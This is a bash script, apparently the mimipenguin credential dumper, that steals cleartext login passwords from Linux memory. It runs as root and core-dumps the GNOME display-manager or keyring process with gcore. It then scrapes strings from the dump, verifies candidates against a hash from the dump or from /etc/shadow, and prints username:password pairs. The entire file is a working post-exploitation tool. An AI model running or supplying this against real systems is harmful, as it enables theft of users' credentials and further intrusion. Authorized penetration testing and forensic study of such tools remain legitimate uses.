#!/bin/bash

# Author: Hunter Gregal
# Github: /huntergregal
# Contribution from pugilist - PID extraction method 
# Dumps cleartext credentials from memory

#root check
if [[ $EUID -ne 0 ]]; then
	echo "Root required - You are dumping memory..."
	echo "Even mimikatz requires administrator"
	exit 1
fi

#If Kali
if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
	#get gdm-session-worker [pam/gdm-password] process
	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	gcore -o /tmp/dump $PID >& /dev/null
	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
	SALT="$(echo $HASH | cut -d'$' -f 3)"
	DUMP="$(strings "/tmp/dump.${PID}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
	DUMP="${DUMP}$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
fi

#If Ubuntu
if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
	#get /usr/bin/gnome-keyring-daemon process
	PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	gcore -o /tmp/dump $PID >& /dev/null
	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
	SALT="$(echo $HASH | cut -d'$' -f 3)"
	DUMP=$(strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
fi

#If hash not in dump get shadow hashes
if [[ ! $HASH ]]; then
	SHADOWHASHES="$(cat /etc/shadow | cut -d':' -f 2 | egrep '^\$.\$')"
fi

#Determine password potential for each word
while read -r line; do
	#If hash in dump, prepare crypt line
	if [[ $HASH ]]; then
		#get ctype
		CTYPE="$(echo $HASH | cut -c-3)"
		#Escape quotes to pass into crypt
		SAFE="$(echo $line | sed 's/\"/\\"/g')"
		CRYPT="\"$SAFE\", \"$CTYPE$SALT\""
		if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $HASH ]]; then
			#Find which user's password it is (useful if used more than once!)
			USER="$(cat /etc/shadow | grep ${HASH} | cut -d':' -f 1)"
			echo "$USER:$line"
		fi
	#Else use shadow hashes
	elif [[ $SHADOWHASHES ]]; then
		while read -r thishash; do
			CTYPE="$(echo $thishash | cut -c-3)"
			SHADOWSALT="$(echo $thishash | cut -d'$' -f 3)"
			#Escape quotes to pass into crypt
			SAFE="$(echo $line | sed 's/\"/\\"/g')"
			CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
			if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $thishash ]]; then
				#Find which user's password it is (useful if used more than once!)
				USER="$(cat /etc/shadow | grep ${thishash} | cut -d':' -f 1)"
				echo "$USER:$line"
			fi
		done <<< "$SHADOWHASHES"
	#if no hash data - revert to checking probability
	else
		if [[ $line =~ ^_pammodutil.+[0-9]$ ]]; then
			echo "[LOW]			$line"
		elif [[ $line =~ ^LOGNAME= ]]; then
			echo "[LOW]			$line"
		elif [[ $line =~ UTF\-8 ]]; then
			echo "[LOW]			$line"
		elif [[ $line =~ ^splayManager[0-9]$ ]]; then
			echo "[LOW]			$line"
		elif [[ $line =~ ^gkr_system_authtok$ ]]; then
			echo "[LOW]			$line"
		elif [[ $line =~ [0-9]{1,4}:[0-9]{1,4}: ]]; then
			echo "[LOW]			$line"
		elif [[ $line =~ Manager\.Worker ]]; then
			echo "[LOW]			$line"
		elif [[ $line =~ \/usr\/share ]]; then
			echo "[LOW]			$line"
		elif [[ $line =~ \/bin ]]; then
			echo "[LOW]			$line"
		elif [[ $line =~ \.so\.[0-1]$ ]]; then
			echo "[LOW]			$line"
		elif [[ $line =~ x86_64 ]]; then
			echo "[LOW]			$line"
		elif [[ $line =~ (aoao) ]]; then
			echo "[LOW]			$line"
		elif [[ $line =~ stuv ]]; then
			echo "[LOW]			$line"
		else
			echo "[HIGH]			$line"
		fi
	fi
done <<< "$DUMP"

#Cleanup
rm -rf "/tmp/dump.${PID}"
